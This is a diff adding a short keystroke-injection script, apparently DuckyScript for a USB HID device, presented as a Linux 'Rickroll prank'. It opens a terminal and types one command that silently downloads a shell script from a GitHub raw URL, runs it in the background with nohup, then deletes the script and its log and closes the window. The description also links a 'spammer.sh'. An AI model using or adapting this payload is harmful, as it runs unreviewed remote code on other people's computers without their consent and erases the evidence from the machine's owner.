@@ -1,0 +1,9 @@
+REM TITLE Rickroll prank
+REM AUTHOR mrLeonTheMaster
+REM DESCRIPTION Runs the rickroll prank on a linux pc, code on https://github.com/mrLeonTheMaster/prank/blob/main/spammer.sh
+
+CTRL-ALT t
+DELAY 1000
+STRING wget -q https://raw.githubusercontent.com/mrLeonTheMaster/prank/main/rickroll.sh && nohup sh rickroll.sh & sleep 3s && rm rickroll.sh && rm nohup.out && exit
+ENTER
+
